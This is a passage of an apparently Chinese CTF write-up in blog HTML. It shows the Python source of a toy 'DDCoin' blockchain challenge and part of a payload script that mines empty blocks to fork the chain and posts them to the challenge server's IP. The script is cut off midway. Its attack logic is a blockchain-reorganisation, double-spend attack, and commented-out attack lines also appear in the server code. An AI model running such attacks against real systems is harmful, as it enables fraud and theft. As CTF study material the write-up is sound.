class="line">    <span class="keyword">return</span> hexed</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_addr_key_pair</span><span class="params">()</span>:</span></div><div class="line">    pubkey, privkey = rsa.newkeys(<span class="number">384</span>)</div><div class="line">    <span class="keyword">return</span> pubkey_to_address(pubkey), privkey</div><div class="line"></div><div class="line">bank_address, bank_privkey = gen_addr_key_pair()</div><div class="line">hacker_address, hacker_privkey = gen_addr_key_pair()</div><div class="line">shop_address, shop_privkey = gen_addr_key_pair()</div><div class="line">shop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()</div><div class="line"></div><div class="line">my_address, my_privkey = gen_addr_key_pair()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_input_utxo</span><span class="params">(input_utxo_id, privkey)</span>:</span></div><div class="line">    <span class="keyword">return</span> rsa.sign(input_utxo_id, privkey, <span class="string">'SHA-1'</span>).encode(<span class="string">'hex'</span>)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_utxo</span><span class="params">(utxo)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [utxo[<span class="string">'id'</span>], utxo[<span class="string">'addr'</span>], str(utxo[<span class="string">'amount'</span>])])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_output_utxo</span><span class="params">(addr_to, amount)</span>:</span></div><div class="line">    utxo = &#123;<span class="string">'id'</span>: str(uuid.uuid4()), <span class="string">'addr'</span>: addr_to, <span class="string">'amount'</span>: amount&#125;</div><div class="line">    utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</div><div class="line">    <span class="keyword">return</span> utxo</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_tx</span><span class="params">(tx)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [</div><div class="line">        reduce(hash_reducer, tx[<span class="string">'input'</span>], EMPTY_HASH),</div><div class="line">        reduce(hash_reducer, [utxo[<span class="string">'hash'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]], EMPTY_HASH)</div><div class="line">    ])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx</span><span class="params">(input_utxo_ids, output_utxo, privkey_from=None)</span>:</span></div><div class="line">    tx = &#123;<span class="string">'input'</span>: input_utxo_ids, <span class="string">'signature'</span>: [sign_input_utxo(id, privkey_from) <span class="keyword">for</span> id <span class="keyword">in</span> input_utxo_ids], <span class="string">'output'</span>: output_utxo&#125;</div><div class="line">    tx[<span class="string">'hash'</span>] = hash_tx(tx)</div><div class="line">    <span class="keyword">return</span> tx</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_block</span><span class="params">(block)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], reduce(hash_reducer, [tx[<span class="string">'hash'</span>] <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]], EMPTY_HASH)])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_block</span><span class="params">(prev_block_hash, nonce_str, transactions)</span>:</span></div><div class="line">    <span class="keyword">if</span> type(prev_block_hash) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">'prev_block_hash should be hex-encoded hash value'</span>)</div><div class="line">    nonce = str(nonce_str)</div><div class="line">    <span class="keyword">if</span> len(nonce) &gt; <span class="number">128</span>: <span class="keyword">raise</span> Exception(<span class="string">'the nonce is too long'</span>)</div><div class="line">    block = &#123;<span class="string">'prev'</span>: prev_block_hash, <span class="string">'nonce'</span>: nonce, <span class="string">'transactions'</span>: transactions&#125;</div><div class="line">    block[<span class="string">'hash'</span>] = hash_block(block)</div><div class="line">    <span class="keyword">return</span> block</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_blockchain_tail</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> max(session[<span class="string">'blocks'</span>].values(), key=<span class="keyword">lambda</span> block: block[<span class="string">'height'</span>])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_utxo</span><span class="params">(blockchain_tail)</span>:</span></div><div class="line">    curr_block = blockchain_tail</div><div class="line">    blockchain = [curr_block]</div><div class="line">    <span class="keyword">while</span> curr_block[<span class="string">'hash'</span>] != session[<span class="string">'genesis_block_hash'</span>]:</div><div class="line">        curr_block = session[<span class="string">'blocks'</span>][curr_block[<span class="string">'prev'</span>]]</div><div class="line">        blockchain.append(curr_block)</div><div class="line">    blockchain = blockchain[::<span class="number">-1</span>]</div><div class="line">    utxos = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blockchain:</div><div class="line">        <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</div><div class="line">            <span class="keyword">for</span> input_utxo_id <span class="keyword">in</span> tx[<span class="string">'input'</span>]:</div><div class="line">                <span class="keyword">del</span> utxos[input_utxo_id]</div><div class="line">            <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</div><div class="line">                utxos[utxo[<span class="string">'id'</span>]] = utxo</div><div class="line">    <span class="keyword">return</span> utxos</div><div class="line">        </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_balance</span><span class="params">(utxos)</span>:</span></div><div class="line">    balance = &#123;bank_address: <span class="number">0</span>, hacker_address: <span class="number">0</span>, shop_address: <span class="number">0</span>&#125;</div><div class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</div><div class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] <span class="keyword">not</span> <span class="keyword">in</span> balance:</div><div class="line">            balance[utxo[<span class="string">'addr'</span>]] = <span class="number">0</span></div><div class="line">        balance[utxo[<span class="string">'addr'</span>]] += utxo[<span class="string">'amount'</span>]</div><div class="line">    <span class="keyword">return</span> balance</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_utxo_signature</span><span class="params">(address, utxo_id, signature)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">return</span> rsa.verify(utxo_id, signature.decode(<span class="string">'hex'</span>), addr_to_pubkey(address))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">append_block</span><span class="params">(block, difficulty=int<span class="params">(<span class="string">'f'</span>*<span class="number">64</span>, <span class="number">16</span>)</span>)</span>:</span></div><div class="line">    has_attrs(block, [<span class="string">'prev'</span>, <span class="string">'nonce'</span>, <span class="string">'transactions'</span>])</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'prev'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'prev'</span>] = str(block[<span class="string">'prev'</span>])</div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'nonce'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'nonce'</span>] = str(block[<span class="string">'nonce'</span>])</div><div class="line">    <span class="comment"># print session['blocks']</span></div><div class="line">    <span class="comment"># print ['prev']</span></div><div class="line">    <span class="keyword">if</span> block[<span class="string">'prev'</span>] <span class="keyword">not</span> <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">"unknown parent block"</span>)</div><div class="line">    tail = session[<span class="string">'blocks'</span>][block[<span class="string">'prev'</span>]]</div><div class="line">    utxos = calculate_utxo(tail)</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'transactions'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">'Please put a transaction array in the block'</span>)</div><div class="line">    new_utxo_ids = set()</div><div class="line">    <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</div><div class="line">        has_attrs(tx, [<span class="string">'input'</span>, <span class="string">'output'</span>, <span class="string">'signature'</span>])</div><div class="line">        </div><div class="line">        <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</div><div class="line">            has_attrs(utxo, [<span class="string">'amount'</span>, <span class="string">'addr'</span>, <span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'id'</span>] = str(utxo[<span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'addr'</span>] = str(utxo[<span class="string">'addr'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> utxo[<span class="string">'id'</span>] <span class="keyword">in</span> new_utxo_ids: <span class="keyword">raise</span> Exception(<span class="string">"output utxo of same id(&#123;&#125;) already exists."</span>.format(utxo[<span class="string">'id'</span>]))</div><div class="line">            new_utxo_ids.add(utxo[<span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'amount'</span>]) != type(<span class="number">1</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of amount of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> utxo[<span class="string">'amount'</span>] &lt;= <span class="number">0</span>: <span class="keyword">raise</span> Exception(<span class="string">"invalid amount of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of address of output utxo"</span>)</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                addr_to_pubkey(utxo[<span class="string">'addr'</span>])</div><div class="line">            <span class="keyword">except</span>:</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"invalid type of address(&#123;&#125;)"</span>.format(utxo[<span class="string">'addr'</span>]))</div><div class="line">            utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</div><div class="line">        tot_output = sum([utxo[<span class="string">'amount'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]])</div><div class="line">        </div><div class="line">        <span class="keyword">if</span> type(tx[<span class="string">'input'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo ids in tx should be array"</span>)</div><div class="line">        <span class="keyword">if</span> type(tx[<span class="string">'signature'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo signatures in tx should be array"</span>)</div><div class="line">        <span class="keyword">if</span> len(tx[<span class="string">'input'</span>]) != len(tx[<span class="string">'signature'</span>]): <span class="keyword">raise</span> Exception(<span class="string">"lengths of arrays of ids and signatures of input utxos should be the same"</span>)</div><div class="line">        tot_input = <span class="number">0</span></div><div class="line">        tx[<span class="string">'input'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'input'</span>]]</div><div class="line">        tx[<span class="string">'signature'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'signature'</span>]]</div><div class="line">        <span class="keyword">for</span> utxo_id, signature <span class="keyword">in</span> zip(tx[<span class="string">'input'</span>], tx[<span class="string">'signature'</span>]):</div><div class="line">            <span class="keyword">if</span> type(utxo_id) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of input utxo"</span>)</div><div class="line">            <span class="keyword">print</span> utxos</div><div class="line">            <span class="keyword">if</span> utxo_id <span class="keyword">not</span> <span class="keyword">in</span> utxos: <span class="keyword">raise</span> Exception(<span class="string">"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed."</span>.format(utxo_id))</div><div class="line">            utxo = utxos[utxo_id]</div><div class="line">            <span class="keyword">if</span> type(signature) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of signature of input utxo"</span>)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> verify_utxo_signature(utxo[<span class="string">'addr'</span>], utxo_id, signature):</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!"</span>.format(utxo_id))</div><div class="line">            tot_input += utxo[<span class="string">'amount'</span>]</div><div class="line">            <span class="keyword">del</span> utxos[utxo_id]</div><div class="line">        <span class="keyword">if</span> tot_output &gt; tot_input:</div><div class="line">            <span class="keyword">raise</span> Exception(<span class="string">"You don't have enough amount of DDCoins in the input utxo! &#123;&#125;/&#123;&#125;"</span>.format(tot_input, tot_output))</div><div class="line">        tx[<span class="string">'hash'</span>] = hash_tx(tx)</div><div class="line">    </div><div class="line">    block = create_block(block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], block[<span class="string">'transactions'</span>])</div><div class="line">    <span class="comment"># print block['hash']</span></div><div class="line">    block_hash = int(block[<span class="string">'hash'</span>], <span class="number">16</span>)</div><div class="line">    <span class="comment"># print block_hash</span></div><div class="line">    <span class="comment"># print difficulty</span></div><div class="line">    <span class="keyword">if</span> block_hash &gt; difficulty: <span class="keyword">raise</span> Exception(<span class="string">'Please provide a valid Proof-of-Work'</span>)</div><div class="line">    block[<span class="string">'height'</span>] = tail[<span class="string">'height'</span>]+<span class="number">1</span></div><div class="line">    <span class="keyword">if</span> len(session[<span class="string">'blocks'</span>]) &gt; <span class="number">50</span>: <span class="keyword">raise</span> Exception(<span class="string">'The blockchain is too long. Use ./reset to reset the blockchain'</span>)</div><div class="line">    <span class="keyword">if</span> block[<span class="string">'hash'</span>] <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">'A same block is already in the blockchain'</span>)</div><div class="line">    session[<span class="string">'blocks'</span>][block[<span class="string">'hash'</span>]] = block</div><div class="line">    session.modified = <span class="keyword">True</span></div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</div><div class="line">        session[<span class="string">'blocks'</span>] = &#123;&#125;</div><div class="line">        session[<span class="string">'your_diamonds'</span>] = <span class="number">0</span></div><div class="line">    </div><div class="line">        <span class="comment"># First, the bank issued some DDCoins ...</span></div><div class="line">        total_currency_issued = create_output_utxo(bank_address, <span class="number">1000000</span>)</div><div class="line">        <span class="comment"># print "lalala:"+str(total_currency_issued)</span></div><div class="line">        genesis_transaction = create_tx([], [total_currency_issued]) <span class="comment"># create DDCoins from nothing</span></div><div class="line">        <span class="comment"># print genesis_transaction</span></div><div class="line">        genesis_block = create_block(EMPTY_HASH, <span class="string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span>, [genesis_transaction])</div><div class="line">        session[<span class="string">'genesis_block_hash'</span>] = genesis_block[<span class="string">'hash'</span>]</div><div class="line">        genesis_block[<span class="string">'height'</span>] = <span class="number">0</span></div><div class="line">        session[<span class="string">'blocks'</span>][genesis_block[<span class="string">'hash'</span>]] = genesis_block</div><div class="line">        </div><div class="line">        <span class="comment"># Then, the bank was hacked by the hacker ...</span></div><div class="line">        handout = create_output_utxo(hacker_address, <span class="number">999999</span>)</div><div class="line">        reserved = create_output_utxo(bank_address, <span class="number">1</span>)</div><div class="line">        transferred = create_tx([total_currency_issued[<span class="string">'id'</span>]], [handout, reserved], bank_privkey)</div><div class="line">        <span class="comment"># print transferred</span></div><div class="line">        second_block = create_block(genesis_block[<span class="string">'hash'</span>], <span class="string">'HAHA, I AM THE BANK NOW!'</span>, [transferred])</div><div class="line">        append_block(second_block)</div><div class="line">        </div><div class="line">        <span class="comment"># Can you buy 2 diamonds using all DDCoins?</span></div><div class="line"></div><div class="line"></div><div class="line">        <span class="comment"># print transferred</span></div><div class="line">        third_block = create_block(second_block[<span class="string">'hash'</span>], <span class="string">'a empty block'</span>, [])</div><div class="line">        append_block(third_block)</div><div class="line"></div><div class="line"><span class="comment"># final</span></div><div class="line">        <span class="comment"># handout2 = create_output_utxo(hacker_address, 1)</span></div><div class="line">        <span class="comment"># transferred = create_tx([total_currency_issued['id']], [handout2], bank_privkey)</span></div><div class="line"></div><div class="line">        <span class="comment"># fake_second_block = create_block(genesis_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># requests.post(url="http://127.0.0.1:5000/b9744af30897e/create_transaction",data=json.dumps(fake_second_block),proxies = &#123;"http":"http://127.0.0.1:8080"&#125;,headers=&#123;"Content-Type":"application/json"&#125;) </span></div><div class="line">        <span class="comment"># append_block(fake_second_block)</span></div><div class="line">        <span class="comment"># fake_third_block = create_block(fake_second_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># append_block(fake_third_block)</span></div><div class="line">        <span class="comment"># fake_fourth_block = create_block(fake_third_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># append_block(fake_fourth_block)</span></div><div class="line"></div><div class="line">        <span class="comment"># try:</span></div><div class="line"><span class="comment"># print "start attack!"</span></div><div class="line"><span class="comment"># x = 0</span></div><div class="line"><span class="comment"># while x &lt;0xfffffff:</span></div><div class="line"><span class="comment"># fouth_block =  create_block(third_block['hash'], str(x), [transferred])</span></div><div class="line"></div><div class="line"><span class="comment"># if  int(fouth_block["hash"],16)&lt;= DIFFICULTY:</span></div><div class="line"><span class="comment"># print fouth_block</span></div><div class="line"><span class="comment"># break</span></div><div class="line"><span class="comment"># x+=1</span></div><div class="line"></div><div class="line">        <span class="comment"># except:</span></div><div class="line"><span class="comment"># print "end at ",hex(x)</span></div><div class="line"><span class="comment"># print "end!"</span></div><div class="line"></div><div class="line"><span class="comment"># append_block(fouth_block)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_balance_of_all</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    tail = find_blockchain_tail()</div><div class="line">    utxos = calculate_utxo(tail)</div><div class="line">    <span class="keyword">return</span> calculate_balance(utxos), utxos, tail</div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">homepage</span><span class="params">()</span>:</span></div><div class="line">    balance, utxos, _ = get_balance_of_all()</div><div class="line">    genesis_block_info = <span class="string">'hash of genesis block: '</span> + session[<span class="string">'genesis_block_hash'</span>]</div><div class="line">    addr_info = <span class="string">'the bank\'s addr: '</span> + bank_address + <span class="string">', the hacker\'s addr: '</span> + hacker_address + <span class="string">', the shop\'s addr: '</span> + shop_address</div><div class="line">    balance_info = <span class="string">'Balance of all addresses: '</span> + json.dumps(balance)</div><div class="line">    utxo_info = <span class="string">'All utxos: '</span> + json.dumps(utxos)</div><div class="line">    blockchain_info = <span class="string">'Blockchain Explorer: '</span> + json.dumps(session[<span class="string">'blocks'</span>])</div><div class="line">    view_source_code_link = <span class="string">"&lt;a href='source_code'&gt;View source code&lt;/a&gt;"</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;br /&gt;&lt;br /&gt;\r\n\r\n'</span>.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info])</div><div class="line">    </div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/flag')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    <span class="keyword">if</span> session[<span class="string">'your_diamonds'</span>] &gt;= <span class="number">2</span>: <span class="keyword">return</span> FLAG()</div><div class="line">    <span class="keyword">return</span> <span class="string">'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span>.format(session[<span class="string">'your_diamonds'</span>]) + shop_address</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_enough_utxos</span><span class="params">(utxos, addr_from, amount)</span>:</span></div><div class="line">    collected = []</div><div class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</div><div class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == addr_from:</div><div class="line">            amount -= utxo[<span class="string">'amount'</span>]</div><div class="line">            collected.append(utxo[<span class="string">'id'</span>])</div><div class="line">        <span class="keyword">if</span> amount &lt;= <span class="number">0</span>: <span class="keyword">return</span> collected, -amount</div><div class="line">    <span class="keyword">raise</span> Exception(<span class="string">'no enough DDCoins in '</span> + addr_from)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span><span class="params">(utxos, addr_from, addr_to, amount, privkey)</span>:</span></div><div class="line">    input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount)</div><div class="line">    outputs = [create_output_utxo(addr_to, amount)]</div><div class="line">    <span class="keyword">if</span> the_change != <span class="number">0</span>:</div><div class="line">        outputs.append(create_output_utxo(addr_from, the_change))</div><div class="line">    <span class="keyword">return</span> create_tx(input_utxo_ids, outputs, privkey)</div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_ddcoin</span><span class="params">(address)</span>:</span></div><div class="line">    balance, utxos, tail = get_balance_of_all()</div><div class="line">    <span class="keyword">if</span> balance[bank_address] == <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'The bank has no money now.'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        address = str(address)</div><div class="line">        addr_to_pubkey(address) <span class="comment"># to check if it is a valid address</span></div><div class="line">        transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey)</div><div class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'b@cKd00R tr1993ReD'</span>, [transferred])</div><div class="line">        append_block(new_block)</div><div class="line">        <span class="keyword">return</span> str(balance[bank_address]) + <span class="string">' DDCoins are successfully sent to '</span> + address</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">return</span> <span class="string">'ERROR: '</span> + str(e)</div><div class="line"></div><div class="line">DIFFICULTY = int(<span class="string">'00000'</span> + <span class="string">'f'</span> * <span class="number">59</span>, <span class="number">16</span>)</div><div class="line"><span class="meta">@app.route(url_prefix+'/create_transaction', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx_and_check_shop_balance</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># print request.data</span></div><div class="line">        block = json.loads(request.data)</div><div class="line">        append_block(block, DIFFICULTY)</div><div class="line">        msg = <span class="string">'transaction finished.'</span></div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">return</span> str(e)</div><div class="line">        </div><div class="line">    balance, utxos, tail = get_balance_of_all()</div><div class="line">    <span class="keyword">if</span> balance[shop_address] == <span class="number">1000000</span>:</div><div class="line">        <span class="comment"># when 1000000 DDCoins are received, the shop will give you a diamond</span></div><div class="line">        session[<span class="string">'your_diamonds'</span>] += <span class="number">1</span></div><div class="line">        <span class="comment"># and immediately the shop will store the money somewhere safe.</span></div><div class="line">        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)</div><div class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'save the DDCoins in a cold wallet'</span>, [transferred])</div><div class="line">        append_block(new_block)</div><div class="line">        msg += <span class="string">' You receive a diamond.'</span></div><div class="line">    <span class="keyword">return</span> msg</div><div class="line">    </div><div class="line">        </div><div class="line"><span class="comment"># if you mess up the blockchain, use this to reset the blockchain.</span></div><div class="line"><span class="meta">@app.route(url_prefix+'/reset')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_blockchain</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'blocks'</span>]</div><div class="line">    <span class="keyword">if</span> <span class="string">'genesis_block_hash'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'genesis_block_hash'</span>]</div><div class="line">    <span class="keyword">return</span> <span class="string">'reset.'</span></div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/source_code')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source_code</span><span class="params">()</span>:</span></div><div class="line">    source = open(<span class="string">'serve.py'</span>, <span class="string">'r'</span>)</div><div class="line">    html = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> source:</div><div class="line">        html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</div><div class="line">    source.close()</div><div class="line">    <span class="keyword">return</span> html</div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(debug=<span class="keyword">False</span>, host=<span class="string">'0.0.0.0'</span>)</div></pre></td></tr></table></figure><p>payload代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span>  server <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line">x = <span class="number">0</span></div><div class="line"></div><div class="line">ip = <span class="string">"116.85.48.107"</span></div><div class="line">port = <span class="string">"5000"</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/"</span>)</div><div class="line"></div><div class="line"></div><div class="line">genesis_block = re.findall(<span class="string">r'genesis block: (.*)&lt;br /&gt;&lt;br /&gt;'</span>,r.content)[<span class="number">0</span>]</div><div class="line">shop_addr = re.findall(<span class="string">r"the shop's addr: (.*)&lt;br /&gt;&lt;br /&gt;"</span>,r.content)[<span class="number">0</span>]</div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line"></div><div class="line"><span class="comment"># print shop_addr</span></div><div class="line"></div><div class="line"><span class="comment"># print genesis_block</span></div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"start attack!"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3</span>):</div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div 